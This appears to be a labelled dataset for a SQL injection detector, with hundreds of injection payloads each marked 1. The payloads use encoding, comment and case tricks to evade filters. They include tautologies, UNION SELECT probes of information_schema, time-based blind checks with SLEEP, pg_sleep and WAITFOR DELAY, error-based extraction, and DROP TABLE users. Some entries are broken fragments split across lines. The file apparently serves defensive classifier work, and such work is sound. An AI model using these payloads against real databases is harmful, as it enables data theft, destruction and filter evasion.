"'%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,2,3--", 1
"' OR '1'%3d%271", 1
"%27%20ANd%201%3DCONVErt%28iNt%2C%40%40VErsION%29--", 1
"WAITFOR/*!*/DELAY '0:0:5'--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20 /*!*/AND 1=1--", 1
"WAIT%46ORDELAY%0d%0a%270:0%3a5'--", 1
"W%41IT%46OR DEL%41Y '0:0:5'--", 1
"1%27/**/OR %61scii(substrin%67(databas%65(), 1, 1)) %3e 100  -- random_noise%2d%2d", 1
"TesT'/**/Or/**/'1'	=  '1'/**/--/**/", 1
"%27%20ANd%201%3DConVerT(int,@@VErSiOn)--", 1
"'    OR    '1'>  = '1", 1
"'/**/%4fR EXIS%54S(SELECT 1 FROM user%73)-%2d OR (1)", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))--", 1
"'				aND				1IN				(1)1				--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 OR (1)----1wtyt17e359m93h", 1
"%27%20AND%201%3D1%20--%20--sh51y9718pba", 1
"'/*!12345*/AND 1>=1 --", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1%27%20aND%20suBStRing(DAtAbaSE(),%201,%201)%20%3D%20%27S%27%20%20or%20(1)--#zx4m19e5m52", 1
"1)UN/*!*/IONSELECT1,database(),3%0d%0a--random_noise----05uu50tm", 1
"%27%20or%201%3d1%20--%20", 1
"%2527%25%320OR%2520%31%2%353D1%2520--%252%30", 1
"test%27OR%271%27%3D%271%27%2F%2A%2112345%2A%2FOR%20%27b%27%3D%27b%27--%2F%2A%250d%250a%2A%2F%2F%2A%250a%2A%2F", 1
"1))/*!%312345*/%55NION SE%4cECT 1,d%61tabase(),%33--", 1
"; SeL%45CT pG%5FSLeep(5%29; --", 1
"WAITFOR DELAY '0:0:5'----9qccwygdec", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%20--%20random_noise--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"'UNIONSELECT1,2,3 OR (1)--/*%0d%0a*/", 1
"' uNIOn seLECT NULl, nULL, NUll --", 1
"%74e%73t'/**/OR/**/'1'='1'/**//* OR (1)", 1
"1/*!12345*/%41ND1=1/*%0a*/", 1
"1%20AND%201%3E%3D1%20AND%20%27a%27%3D%27a%27", 1
"1)UNIoN/*%0D%0A*/SEleCT1,DaTABaSE(),3/*%0a*/#moRE_nOise--/*%0a*/", 1
"1) UNION SELECT 1%2cda%74abase%28),3-%2d", 1
"1%u0027%U0020oR%u0020IF(substrINg(dATABASe(),%u00201,%U00201)=%U0027a%U0027,%u0020SleEP(5),%u00200)%u0020----m39rt", 1
"1%u0027/*!12345*/UNIoN%u0020SEleCT%u0020tAblE_naMe,%u0020NULL,%u0020nULl%u0020FROm%u0020iNfORmATIOn_schEMA.TaBles%u0020--", 1
";%20seLECt%20PG_SLeEP(5);%20--", 1
"' OR 1<=1 --", 1
"1'/**//**//**/oR/**//**//**/ascIi(SuBstrINg(DaTABaSe(),/**//**//**/1,/**//**//**/1))/**//**//**/>/**//**//**/100/**//**//**/--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
";/*!12%3345*/DROP%20TABLE u%73ers;%20--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271 /*!*/AND 1=1", 1
"' OR 1=1 %2d- #5bx%6ecusg%722t", 1
"1'UNIO%4eSELECTtable%5fname,/*%0%64%0a*/nul%6c,nul%6cFROMinformation_schema.ta%62l%65s/*%%30%61*/%23", 1
"more_noise--", 1
"tes%2574%25u0027%25u0020O%2552%25u0020%25u00271%25u0027%3D%25u0027%2531%25u0027%25u0020--%25u0020", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2C2%2C3--", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020", 1
"%27/*!12345*/AND%201%3Dconvert(int,@@version)--", 1
"1' aNd SuBstriNG(daTABASe(), 1, 1) = 'S'  OR 'b'='b'--", 1
"%27XOR%2F%2A%250d%250a%2A%2Fextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%250d%250a", 1
"%27%20XOR%201%3D1%20--%20", 1
"'/**/OR/**/1=1/**/--/**/", 1
"1 AND 1=1 OR 'b'='b'", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20", 1
"'%09UNION%09SELECT%09null,%09null,%09null%09%09#%09more_noise--%09", 1
"AdmIN'/*!12345*/or '1'='1 # mORe_noisE", 1
"%61dmin'/**/X%4fR/**/'1'='1/**/OR%20'b'='b'", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271", 1
"ADMIN%27%20OR%20%271%27%3d%271", 1
"%27%09%09UN/*!12345*/ION%09%09SELECT%09%091,2,3--", 1
"1))UNION", 1
"SELECT/*%0d%0a*/1,database(),3 # more_noise--/*%0d%0a*/", 1
"adMIn' XOR '1'='1", 1
"1/*!*/AND 1=1", 1
"1' AND substring(database(), 1, 1) = 's' --#7fra6i", 1
"%27ANd%0AeXtRAcTVAlUE%281%2CCOncaT%280x5c%2CversIon%28%29%29%29--%250A", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29IN%20%281%29%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"%27%20A/*!*/ND%201%3dcONVErT(inT,@@veRsIoN)--", 1
"test'/**/OR/**/'1'='1'/**/--/**/", 1
"; drOp tAblE USerS; --", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F%20OR%20%281%29--%2F%2A%2A%2F", 1
"%27%20Or%20ExIStS%28SeLecT%201%20FROM%20usERS%29--", 1
"WAITFO/*!12345*/R/**/DELAY/**/'0:0:5'--", 1
"'AND%0a1=convert(int,@@version)--", 1
"' oR%20'1'='1 /*!*/AND 1%3d1%23x%39teo447mmb2", 1
"test%27%20OR%20%271%27%3D%271%27%20/*OR/*%0d%0a*/'b'='b'#8ka8r/*%0d%0a*/", 1
"1'OR", 1
"I%46(substring%28databas%65(),1,%0a1)='a',%53L%45EP(5),0%29--%0d%0a", 1
"%27/*!*/AND/**/1%3D1/**/--/**/", 1
"; SELE%43T %70g_sle%65p(5);  # more_noise--", 1
"1'/**/uniON/**/sELECT/**/Table_NAME,/**/NUll,/**/NUll/**/from/**/infoRMaTiON_SChEmA.tABLeS/**/--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027%09=%09%u00271", 1
"test%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2F%25u00271%25u0027%3D%25u00271%25u0027%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"Waitfor DElay '0:0:5'----Ec4oBJtoI", 1
"WAITFO/*!12345*/R%20DELAY%20%270%3A0%3A5%27--", 1
";%20seLecT%20Pg_SLEEp(5);%20--", 1
"1%%750027%u002%30A%4e%44%u00%320substri%6eg(database(),%u00201,%u00201)%u00%320=%u%30020%u0027s%u%30027%u0020--", 1
"%u0027/**/OR/**/1IN%u0020(1)1/**/--/**/", 1
"1%27%20O/*!12345*/R%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"' OR 1=1 -- #jp8ncb7cfkk7", 1
"%27%20%20%20%20%20%20AND%20%20%20%20%20%201%09%3D%20convert(int,@@version)--", 1
"wAITfOr%20DeLaY%20%270:0:5%27--", 1
"%27%20OR%20EXISTS%28SEL/*!*/ECT%201%20FROM%20users%29--", 1
"test%25u0027%2F%2A%2A%2F%25u0020OR%25u0020%25u0020%25u00271%25u0027%2520%3D%2509%25u00271%25u0027%25u0020%25u0020--%25u0020%25u0020", 1
"; DroP TABle uSErs; --", 1
"1%u0027%u0020A/**/ND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"WAITFOR%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027--", 1
"1%29%20UNION%20SE%4cECT%201%2Cda%74ab%61%73%65%28%29%2C3--", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--#ax47qc", 1
"1) unioN selECt 1,databaSe(),3--", 1
"test' OR '1'='1' /*--m922eq5pn", 1
"%u0027%u0020oR%u0020exIsts(sel/*!12345*/EcT%U00201%U0020FrOM%U0020uSErS)--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020 /*!*/AND 1=1--", 1
"%u0027%u0020O/**/R%u0020%u00271%u0027<=%u00271--xktvx55q", 1
"%u0027%u0020And%u0020extracTVaLue(1,CoNCAT(0X5c,vErSIOn()))--", 1
"' UNiOn sElecT 1,2,3--", 1
"%27%20XOR%20%31%3d1%20--%20", 1
";%20DROP%20TABLE%20users;%20--", 1
"%27%20UNION%20SELECT%201,2,3--", 1
"1'/**/OR/**/IF(subs%74r%69ng(d%61tabase(),/**/1%2c/**/%31)='a%27,/**/SLEEP(5),/**/0)/**//**/#/**/more_noise--", 1
"1'/**/O/*!12345*/R/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**//**/AND/**/'a'='a'----phen4nbz", 1
"test' OR '1'=%271'%20/*", 1
"1)UNION%0aSELECT/*%0a*/1,database(),3--", 1
"' aNd exTRAcTvAlUe(1,ConcaT(0x5C,veRSiOn()))--", 1
"1' UNION SELEC%54 %74able_name,%20null, nu%6c%6c %46%52OM information_schema.%74ables --#i1b%71hlfpz95uq8b", 1
"'/*!*/ANd/**/1=cOnvert(InT,@@VErSiOn)--", 1
"%u0027%u0020A/**/ND%u0020%31=%63o%6evert(i%6et,@@version)--", 1
"%27/**/OR/**/%271%27%3D%271 # more_noise", 1
"%27%20Or%20%2531IN%20%281%291%20--%2520", 1
"' OR '1%27='1 /%2a!*/AND 1=%31", 1
"'/**/U%4eION/**/S%45L%45CT/**/1,%32,3/*!*/# mo%72e_noise--", 1
"1))%09%09UNION%09%09SELECT%09%091,database(),3--", 1
"admin%u0027%u0020O/*!12345*/R%u0020%u00271%u0027%09=  %u00271", 1
"admin' XOR '1'='1 OR (1)", 1
"test'/**/O/*!*/R/**/'1'='1'/**//**/OR/**/(1)--/**/", 1
"admin%27%20XOR%20%271%27%3D%271--nm6t4jk", 1
"%3B%2F%2A%2A%2FSELECT%2F%2A%2A%2Fpg_sleep%285%29%3B%2F%2A%2A%2F%2F%2A%2A%2F%23%2F%2A%2A%2Fmore_noise--", 1
"%253b%20D%2552OP%20TABLE%20users%3B%20%252d- -- random_noise", 1
"' UNION SELECT null, null, null  # more_noise-- --p7i9cpx", 1
"1)/**/uNION seLECt 1,DATABASE(),3--", 1
"' AND 1>=convert(int,@@version)--", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--", 1
"1%27/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**//**/#/**/more_noise--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#uc8t1c6", 1
"%31%27%20AN%44%20%73ubstring(dat%61base%28),%201,%201)%20%3D%20%27s%27%20--", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2C2%2C3%2F%2A%2A%2F--%2F%2A%2A%2Frandom_noise----rf8lnws", 1
"%27O/*!*/R%271%27%3D%271/*%0d%0a*/", 1
"1%27%20anD%20sUBsTRiNg(dATabase(),%201,%201)%20%3D%20%27S%27%20--", 1
"1%u0027/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"%27%20AnD%201%3D1%20%20--%20random_noise--%20", 1
"1%20AND%201%3C%3D1", 1
"admin%27O/*!*/R%0%64%0a%2%371%27%3%44%271", 1
"%u0027/*!12345*/AND%u00201=convert(int,@@version)--", 1
";/*!*/DROP TABLE users;%20%2d%2d", 1
"%27%20oR%201%3d1%20--%20#69O8ZQdiXX", 1
"1'%09%09OR%09%09IF(substring(database(),%09%091,%09%091)/**/= 'a',%09%09SLEEP(5),%09%090)%09%09--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3/**/AND/**/'a'='a'--", 1
"' UNION SELECT null, null, null  -- random_noise--", 1
"1 xOR 1=1", 1
"'/*!12345*/AND 1=convert(int,@@version)--", 1
"1))%20%20UN/*!*/ION%20%20SELECT%20%201,database(),3--", 1
"'/**/AND 1=1 --", 1
"1' oR iF(SUbsTRINg(DATabAse(), 1, 1)<='A', SlEEP(5), 0)  -- random_noise--", 1
"'/**/&&/**/1=1/**//**/--/**/random_noise--/**/", 1
"1%20An%64%201%3d%31", 1
"test%2527%2520OR%2520%25271%2527%253D%25271%2527%2520%2F%2A", 1
"test%27%20%4f%52%20%271%27%3D%271%27%20--%20", 1
"'%09%09%09%09%09AND%09%09%09%09%091	LIKE%20convert(int,@@version)--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020----nju78u10y", 1
";/**/SELECT pg_sleep(5);  OR 'b'='b'--#btx0h9b", 1
"' or '1'>='1 OR (1)", 1
"1) unIon selEct 1,dAtabaSE(),3--#G6i3S", 1
"%2527%2520AND%25201%253Dconvert%28int%2C%40%40version%29--", 1
"test'%09%09%09%09%4fR%09%09%09%09'1'%20=/**/ '%31'%09%09%09%09/* AND 'a'='a'", 1
"1))/*!12345*/UNION SELECT 1,database(),3--", 1
"'/*!12345*/UNIONSELECT%0d%0a1,2,3--/*%0a*/", 1
"test' OR '1'='1' /*#2rjzghxpy1rji", 1
"1' oR ASCiI(SUBsTRIng(DatAbasE(), 1, 1)) > 100 --", 1
"1%29%25u0020UN%2549ON%25u0020%2553ELECT%25u00201%2Cdatabase%28%2529%2C%2533--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"1'ORIF(substring(database(),1,1)LIKE'a',/*%0d%0a*/SLEEP(5),0)", 1
"--", 1
"test%u0027/*%21*/OR%u0%302%371%%750%3027=%u%300271%u0027/*%0d%0a*//*%0a", 1
"1'/*!*/XOR IF(substring(database(), 1, 1)>='a', SLEEP(5), 0) ----td1higqifimilj", 1
"test'/*!12345*/OR '1'='1' /*", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/ OR 'b'='b'--", 1
"%3B%20SEL/*!*/ECT%20pg_sleep%285%29%3B%20--", 1
"%u0027%u0020AN%44%u00201=1%u0020 OR 'b'='b'--%20", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))/*!*/# more_noise----tihy01spluejd", 1
"test' OR '1'='1' -- #5tly1bktcu24e", 1
"1)/*!*/UN%49ON%20/*%0d%0a*/SELECT%0d%0a1,da%74abase%28),3--/*%0d%0a*/", 1
"admin'%09%09OR%09%09'1'  =	'1", 1
"%27%20&&%201%3D1%20--%20#a0uu9x13czd", 1
"1'%20AND%20substring(database(),%201,%201)%20 =%09%20's'%20--", 1
"'		OR		1 =  1		--", 1
"' OR EXISTS(SELECT 1 FROM users)--#qqggm3", 1
"%3B%2520sElecT%2520pG_slEep%285%29%3B%2520--", 1
"%27%20%20UNION%20%20SELECT%20%201%2C2%2C3--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"%27 OR%20'1'='1", 1
"'/*!*/xOr ExiSts(SeLEct 1 FROm USerS)--", 1
"%%750027%u0020OR%u0020EXISTS%28SELECT%u00201%u0%3020FROM%u%30020%75s%65rs)--", 1
"%27%20AND%201%3Dconvert(int,@@version) OR (1)--", 1
"1/*!12345*/and 1=1 OR (1)", 1
"TeST%27%2f%2A%2A%2For%2f%2a%2A%2f%271%27%3d%271%27%2F%2a%2A%2f%2f%2A", 1
"' AND 1=convert(int,@@version) -- random_noise--", 1
"%27%20%20%20%20AND%20%20%20%201%09%3D%25201%2520--%2520", 1
"admin%27%20OR%20%271%27%3D%271#syctrjnj", 1
"1)/**/UnIOn/**/SeLect/**/1,dAtABASE(),3--", 1
";/*!*/SELECT pg_sleep(5); --", 1
"' UNION SELECT null, null, null  AND 'a'='a'--", 1
"%27%20OR%201%3D1%20 -- random_noise--%20", 1
";/**/SELECT/**/pg_sleep(5);/**/----j7v0tih9", 1
"admin' OR '1'>='1", 1
"W%41ITFOR DELAY %27%30:0:5'--", 1
"'O/*!*/R", 1
"'1'='1", 1
";%20dROp%20TABLe%20UsErS;%20 /*!*/AND 1=1--", 1
"%U0027%u0020Or%u00201>=1%u0020--%U0020", 1
"1)/**/UNION SELECT 1,database(),3--#tz3tl6p1vh7e", 1
"%u0027%u0020%4fR%u%30020%u00271%%750027> =%20%u002%371", 1
"1'%20%20%20OR%20%20%20IF(substring(database(),%20%20%201,%20%20%201) =%09'a',%20%20%20SLEEP(5),%20%20%200)%20%20%20--", 1
"'/*!*/UNION SELECT null, null, null --", 1
"' AND extractvalue(1,conc%61t(%30x5c%2c%76ersion())%29--", 1
"%3B%2520seleCT%2520Pg_sLEEp%285%29%3B%2520--", 1
"'%20%20%20%20%20OR%20%20%20%20%201%09= 1%20%20%20%20%20--%20%20%20%20%20", 1
"%3B%2F%2A%2A%2FDROP%2F%2A%2A%2FTABLE%2F%2A%2A%2Fusers%3B%2F%2A%2A%2F--", 1
"' OR EXISTS(SELECT 1 FROM users)----8kxvucd", 1
"' UNION SELECT null, null, null  /*!*/AND 1=1-- --0m91vrbllw", 1
"'/**/UNIONSELECT%0d%0a1,2,3--", 1
"'/**/Or/**/'1'<='1#v2g9wk4mh", 1
"'/**/OR/**/'1'%20=  '1#93tqqj", 1
"1))/*!12345*/uNIOn/**/sElECT/**/1,DaTAbaSE(),3/**/#/**/MORE_nOisE--", 1
"%27%2F%2A%21%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29--", 1
"1'%20Or ASCii(S%75bsTrING(DAtABa%73E(), 1,%201)%29 > 100 --", 1
"tEST'/**/Or/**/'1'='1'/**/--/**/--B6piNnkkL", 1
"test'					XOR					'1'%20=%09'1'					 -- random_noise--					--c3j61mf5q81q", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#fjgz1hy", 1
"test%27%20XOR%20%271%27%3D%271%27%20%2F%2A", 1
";%20DROp%20tAbLe%20Users;%20----ahohrdk8m5qz5a", 1
"1 aNd 1>=1", 1
"'/**/OR/**/'1'='1", 1
"1'/**/OR/**%2fIF(substr%69%6e%67(dat%61ba%73e(),/**/1,/**/1)='%61',/**/SLEEP(%35),/**/0)/**/--", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2FIF%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%3D%27a%27%2C%2F%2A%2A%2FSLEEP%285%29%2C%2F%2A%2A%2F0%29%2F%2A%2A%2F--", 1
";/**/DROP/**/TABLE/**/users;/**/--#11r5c46", 1
"1%u0020AND%u00201=1", 1
"1'ORascii(substring(database(),1,1))/*%0a*/>/*%0a*/100--", 1
";			SELECT			pg_sleep(5);			----9r9q5zc6j84y", 1
"'/**/uNiOnSEleCT", 1
"NULl,NUlL,/*%0d%0a*/null%0a--", 1
"'UNION/*%0d%0a*/SELECT1,2,3--", 1
"%27/**/UNION/**/SELECT/**/1,2,3--#1jjv27mat0f6kb6", 1
"'%20UNION%20SELECT%201,2,3--#ifczrg9", 1
"admin%27%20%7C%7C%20%271%27%3D%271%20OR%20%27b%27%3D%27b%27", 1
"1 XOR 1=1", 1
"1 %41ND 1=1", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/ /*!*/AND 1=1--", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version())) OR 'b'='b'--%0a--c0kx9", 1
"1%25u0027%25u0020%26%26%25u0020%281%3D1%29substr%2569ng%28da%2574a%2562ase%28%29%2C%25u002%25301%2C%25u%25300201%29%25u0020%3D%25u%2530%253020%25%25750027s%25u0027%25u00%25320--", 1
"WAITFOR%u0020D%45LAY%u00%320%u002%370:0:5%u002%37--", 1
"'%09%09UNION%09%09SELECT%09%091,2,3--", 1
"'/*!*/or '1'='1#wu40urm", 1
"; SELECT pg_%73leep(5%29; -%2d#1%6a16n", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----10g2q0k", 1
"' XOR 1<=1 -- --kyhxt2rvrw74hse", 1
"1'||%0d%0aascii(substring(database(),1,1))%0d%0a>100--%0d%0a", 1
"'/*!*/OR'1'='1/*%0a*/", 1
"admin' OR '1'='1 OR (1)", 1
"%u0027UNIONSELECT", 1
"1,2,3--", 1
"1%27UNIONSELECT/*%0a*/table_name,null,null%0d%0aFROMinformation_schema.tables--", 1
"%27%%320AND%20extractvalu%65(1,concat(0x5c,ve%72sion()%29)%2d-", 1
"1%27%20anD%20SUbstring(daTABaSe(),%201,%201)%20%3D%20%27S%27%20--", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271--2iqh0kz", 1
"; DROP TaBle uSers; --", 1
";DROP/*%0a*/TABLE/*%0d%0a*/users;--/*%0a*/", 1
"TesT%27%20XOR%20%271%27IN%20(1)%271%27%20--%20", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--", 1
"1' and subSTrINg(dATabasE(), 1, 1) = 's' ----gqyls", 1
"'     OR     EXISTS(SELECT     1     FROM     users) -- random_noise--", 1
"%u0027%u0020A%4e%44%u00201%3dconvert(int,@@versi%6fn)--", 1
"'/**/AND ex%74ractval%75e(1,concat(%30x5c,vers%69%6fn()))--#yod79ymwn", 1
"1%u0027%u0020UN/*!*/ION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
"%27%20%7C%7C%201%253d1%20%252d-%20", 1
"AdMiN%25U0027%25u0020oR%25u0020%25u00271%25u0027%3D%25u00271", 1
"1'ORiF(subSTring(daTaBasE(),%0a1,", 1
"1)='a',SLEep(5),0)/*%0d%0a*/--", 1
"%27%20UnION%20SEleCt%201%2C2%2C3--", 1
"' OR EXISTS(SELECT 1 FROM users) AND 'a'='a'--", 1
"%u0027%u0020||%u0020EXISTS(SEL/*!12345*/ECT%u00201%u0020FROM%u0020users)--", 1
"1'   OR   ascii(substring(database(),   1,   1))   >   100   --", 1
"%27%20or%20%271%27%3D%271 AND 'a'='a'--s14t0lh8ic", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"' && 1=1 --", 1
"tEST%27%20or%20%271%27%3D%271%27%20--%20", 1
"%27%20OR%20%271%27%3D%271%23fm5jp", 1
"'/*!12345*/AND extractvalue(1,concat(0x5c,version()))----132kkfa3afq5", 1
"%u0027%u0020AND%u0020extractvalue(1,%63o%6ecat(0x5c,ve%72sio%6e(%29%29) OR (1)--", 1
"1%27%2509%2509%2509%2509%2509UNION%2509%2509%2509%2509%2509SELECT%2509%2509%2509%2509%2509table_name%2C%2509%2509%2509%2509%2509null%2C%2509%2509%2509%2509%2509null%2509%2509%2509%2509%2509FROM%2509%2509%2509%2509%2509information_schema.tables%2509%2509%2509%2509%2509--", 1
"1 AND 1	= 1 /*!*/AND 1	= 1", 1
"WAITFOR%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027%20AND%20%27a%27%3D%27a%27--", 1
"'O/*!12345*/R%0d%0a'1'='1/*%0a*/", 1
";/**/DROP/**/TABLE/**/users;/**/--", 1
"1%27%20O/*!*/R%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"' || 1=1  AND 'a'='a'--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 # more_noise--#emuqng1fkr3c", 1
"TEsT%27/*!*/OR%20%271%27%3D%271%27%20--%20", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%20%3D	%271%27%20%20%20%20--%20%20%20%20", 1
"'/**/oR/**/eXiSTs(s%45LEc%74/**/1/**/FROM/**/u%73eRs)%2d-#azjsbbfy12lm", 1
"%u0027/*!12345*/OR%u0020%u00271%u0027=%u00271", 1
"WAI%54FOR %44ELAY '0:0:%35'----dsez%38fwfq6mhp%6e4", 1
"%25u0027%25u0020AND%25u0020extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"%27OREXISTS%28SELECT%0A%2531%0A%2546ROM%2575sers%29-%252d", 1
"1' || (1=1)IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"'UNIONSELECTnull,%0d%0anull,null/*%0d%0a*/--/*%0d%0a*/", 1
"%27UNION", 1
"SELECTnull,null,null--/*%0d%0a*/", 1
"'/*%21*/OR    1	%3d%201%20       #   %20mo%72e_noise--", 1
"%u0027%u0020AND%u00201>=1%u0020--%u0020", 1
"%2527%09%09AND%09%091%2520%2520%253D%2520%25201%09%09--%09%09", 1
"%27UNIONSELECTnull,null,%20null%0a--%0a--mph%62ae%75u2k%6c", 1
"1'/**/O%52/**/ascii(substrin%67%28da%74abase(),/**/%31,/**/1))/**/%3e/*%2a/100/*%2a/--", 1
"'uNiOn/*%0a*/seLECT%0d%0a1,2,3--/*%0d%0a*/", 1
"%27%20OR%201%3D1%20%20--%20random_noise--%20", 1
"%3B%20DROP%20TABLE%20users%3B%20 # more_noise--", 1
"TeST'/*!*/OR/**/'1'='1'/**//*", 1
"%27%20or%201%3d1%20--%20--y1Po0R0OBr", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20%09%09%09AND%09%09%09'a'  =  'a'--%20", 1
"adm%2569n%27%2520%2520OR%2520%2520%271%2527%20%20%3D%09%271", 1
"1%27OR%0d%0aascii(substring(database(),1,", 1
"1%29)/*%0a*/>%20%3100%2d-", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29--", 1
"' U%4eION %53EL%45CT 1,2,3--", 1
"1'/**/O/*!12345*/R/**/IF(%73ubstri%6eg(dat%61base(%29,/**/1,/**/1)%3d'a',/**/SLEEP(5),/**/%30)/**/ -- random_noise--", 1
"'/**/AND/**/1<  =  convert(int,@@version)--#xrfx2ukpw6gjn5r", 1
"%27%20&&%20(1%3D1)1%3Dconvert(int,@@version)----k5zvgr8lpn", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020", 1
"test%27OR%2F%2A%250a%2A%2F%271%27%3D%271%27%250d%250a--", 1
"%27%20uNiON%20select%20NuLl%2c%20nuLL%2c%20NulL%20--%20#2kelud", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--", 1
"test'/**/  || (1=1)  '1' =	'1'   /* OR 'b'='b'", 1
"1%27%%320AND%20substring%28da%74abase%28%29%2C%201%2%43%201%29%%32%30%%33D%%320%27s%27%20--", 1
"'/*!12345*/AND/**/1LIKEconvert(int,@@version)--#ihgcv2e", 1
"1)uNiOn/*%0D%0A*/SeLECT/*%0D%0a*/1,DAtAbAse(),3--%0D%0a", 1
"1%27/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/%20OR%20%27b%27%3D%27b%27----87r2r61kwxz5", 1
"1' OR ascii%28su%62string(data%62ase(), 1, 1))%20> 100%20--", 1
"1'ORascii(substring(database(),1,1))>100%0d%0a--", 1
"%27/*!*/OR%201%3D1%20--%20", 1
"1%25u0027%25u0020UNION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020--%23bzy1i7", 1
"admIn%27or%0d%0A%271%27%3D%271/*%0a*/", 1
"tEST'OR%0D%0a'1'%09=%20'1'/*%0A*//*%0A OR (1)", 1
"1'/*!*/UNION SELECT table_name, null, null FROM information_schema.tables --", 1
"' OR EXISTS(SELECT 1 FROM users)--#hvckzzaygwv", 1
"WAITFOR          DELAY          '0:0:5'----hc0rob", 1
"1%29%20UNioN%20seLECt%201%2CdATABasE%28%29%2C3--", 1
"'				aND				ExTrAcTvAlUE(1,concaT(0x5c,veRSioN()))--#t8f8ra3c", 1
"%27%20%20%20%20%20%20%20%20OR%20%20%20%20%20%20%20%20%271%27%20%3D%20%271", 1
"'%20UNION%20SELECT%20null,%20null,%20null%20 # more_noise--%20", 1
";/**/DROP TABLE users; ----x6j4aiat", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20%u0020#%u0020more_noise--", 1
"1)%20unioN%20sE%4cEC%74%201,dATa%62%61sE(),3 # more_noise--", 1
"test' OR '1'='1' /* OR 'b'='b'", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3--", 1
"1)) UNION SELECT 1,database(),3 AND 'a'='a'--", 1
"WAITFORDELAY", 1
"'0:0:5'--", 1
"test'OR'1'='1'/*%0d%0a*//*", 1
"' %41ND 1=1  /*!*/AND 1=1-- #r8%32j3%30m66ryqknw", 1
"WAITFOR%20DELAY%20'0:0:5'%20#%20more_noise--", 1
"1'UNIONSELECTtable_name,null,nullFROM", 1
"information_schema.tables--", 1
"'A/*!12345*/ND", 1
"1IN/*%0d%0a*/(1)convert(int,@@version)--", 1
"%25u0027%2%35%75%30020OR%25u0020%45XISTS%28SELECT%25u00201%2%35u0%3020F%52OM%25u0020%75sers%29--", 1
";DROPTABLE%0ausers;--", 1
